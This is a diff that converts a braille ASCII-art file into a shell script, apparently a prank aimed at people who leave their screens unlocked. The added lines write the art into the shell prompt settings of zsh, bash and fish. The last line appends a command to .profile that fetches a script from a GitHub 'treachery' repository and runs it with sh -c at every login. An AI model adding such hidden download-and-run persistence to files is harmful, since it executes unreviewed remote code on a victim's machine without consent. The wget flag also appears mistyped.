@@ -1,4 +1,6 @@
-⠀⠀⠀⠀⡠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢄⠀⠀
+#!/bin/sh
+
+PROMPT="⠀⠀⠀⠀⡠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢄⠀⠀
 ⠀⠀⢀⠎⠀⠈⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠔⠁⠀⢣⠀
 ⠀⠀⡎⠀⠀⠀⠀⠑⡄⠀⠀⢠⠀⣤⡄⠀⠀⠀⠀⠀⠀⠀⢠⠊⠀⠀⠀⠀⠈⡄
 ⠀⢰⠁⠀⠀⠀⠀⠀⠈⠢⡀⠈⡄⠀⠀⠉⠒⠄⡀⠀⠀⡠⠃⠀⠀⠀⠀⠀⠀⢃
@@ -18,4 +20,6 @@
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢃⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀"
+echo -n "\nPS1=\"${PROMPT}\"" | tee -a ~/.zshrc | tee -a ~/.bashrc >> ~/.config/fish/config.fish
+echo -n 'sh -c "$(wget -q0 - https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master/assorted/you_like_leaving_your_screen_unlocked_dont_you.sh)"' >>.profile
